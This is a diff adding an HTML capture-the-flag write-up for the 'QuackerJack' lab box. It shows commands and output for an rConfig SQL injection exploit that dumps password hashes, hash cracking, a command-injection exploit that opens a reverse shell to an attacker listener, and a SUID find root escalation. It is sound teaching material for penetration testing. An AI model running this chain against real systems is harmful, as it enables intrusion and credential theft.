@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>QuackerJack &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>QuackerJack</h1>
+    <div class="meta">Target: <code>192.168.206.57</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">rConfig</span><span class="tag">SQLInjection</span><span class="tag">HashCracking</span><span class="tag">CommandInjection</span><span class="tag">SUID</span><span class="tag">find</span><span class="tag">GTFOBins</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#sql-injection-to-extract-admin-hash">SQL Injection to Extract Admin Hash</a><a class="lvl3" href="#authenticated-command-injection">Authenticated Command Injection</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#suid-find">SUID find</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>QuackerJack is a Linux box running rConfig 3.9.4 on port 8081. A SQL injection vulnerability leaks the admin password hash, cracking it gives access to the panel, and a second authenticated command injection exploit provides a shell as <code>apache</code>. From there, a SUID <code>find</code> binary is the entire privilege escalation.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.2  (anonymous login allowed)
+22/tcp   open  ssh         OpenSSH 7.4
+80/tcp   open  http        Apache httpd 2.4.6 (CentOS) PHP/5.4.16
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 4.10.4
+3306/tcp open  mysql       MariaDB (unauthorized)
+8081/tcp open  http        Apache httpd 2.4.6 (CentOS) PHP/5.4.16
+</code></pre>
+<p>Port 80 is a default Apache CentOS test page. Gobuster found nothing interesting there. Port 8081 hosts:</p>
+<pre><code>rConfig Version 3.9.4
+</code></pre>
+<p>Searchsploit for <code>rConfig 3.9</code> yields multiple results. Two are relevant:</p>
+<pre><code>rConfig 3.9 - 'searchColumn' SQL Injection
+rConfig 3.9.4 - 'search.crud.php' Remote Command Injection (authenticated)
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="sql-injection-to-extract-admin-hash">SQL Injection to Extract Admin Hash</h3>
+<p>The SQL injection exploit runs unauthenticated and dumps user credentials from the database:</p>
+<pre><code class="language-sh">python3 48208.py https://192.168.206.57:8081/
+rconfig 3.9 - SQL Injection PoC
+[+] Triggering the payloads on https://192.168.206.57:8081//commands.inc.php
+[+] Extracting the current DB name: rconfig
+[+] Extracting 10 first users:
+admin:1:‹redacted›
+fbesamqurx:365:‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why SQL injection in admin panels is so useful:</strong> Even if you can't use an SQLi to get a shell directly, dumping the users table gives you credential material. An MD5 hash (the <code>$</code> prefix is absent) is fast to crack against a rainbow table or common wordlist.</p>
+</blockquote>
+<p><code>‹redacted›</code> cracked via CrackStation:</p>
+<pre><code>‹redacted›
+</code></pre>
+<p>Credentials:</p>
+<pre><code>admin : ‹redacted›
+</code></pre>
+<h3 id="authenticated-command-injection">Authenticated Command Injection</h3>
+<p>With valid admin credentials, the second exploit applies:</p>
+<pre><code>rConfig 3.9.4 - 'search.crud.php' Remote Command Injection
+</code></pre>
+<p>Running it with the recovered credentials and a Kali listener on port 80:</p>
+<pre><code class="language-python">python3 48241.py https://192.168.206.57:8081 admin ‹redacted› 192.168.45.167 80
+</code></pre>
+<p>Shell caught as <code>apache</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.57] 49978
+bash-4.2$ whoami
+apache
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-python">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-find">SUID find</h3>
+<p>LinPEAS identifies the <code>find</code> binary with the SUID bit set:</p>
+<pre><code class="language-sh">-rwsr-xr-x. 1 root root 195K Oct 30  2018 /usr/bin/find
+</code></pre>
+<blockquote>
+<p><strong>Why SUID on <code>find</code> is a root shell:</strong> When a binary has the SUID bit, it runs with the file owner's privileges (root here) regardless of who executes it. <code>find</code> supports <code>-exec</code>, which runs arbitrary commands as part of its search. Combining these: <code>find . -exec /bin/sh -p \; -quit</code> launches a shell with <code>-p</code> (preserve SUID effective UID), which is a root shell.</p>
+</blockquote>
+<pre><code class="language-sh">bash-4.2$ find . -exec /bin/sh -p \; -quit
+sh-4.2# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">sh-4.2# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Layer exploits: unauthenticated SQLi feeds the authenticated RCE.</strong> Neither exploit alone is enough without the other; the chain is: dump hash, crack hash, authenticate, execute.</li>
+<li><strong>SUID binaries on GTFOBins are immediate privesc.</strong> Any binary in <code>find / -perm -4000</code> output should be cross-referenced with GTFOBins before anything else. <code>find</code>, <code>vim</code>, <code>python</code>, <code>perl</code> with SUID all give root in one command.</li>
+<li><strong><code>apache</code> runs web processes on many CentOS installs.</strong> Landing as <code>apache</code> rather than <code>www-data</code> is a CentOS-ism, not a different privilege level, still a low-privilege web process user.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
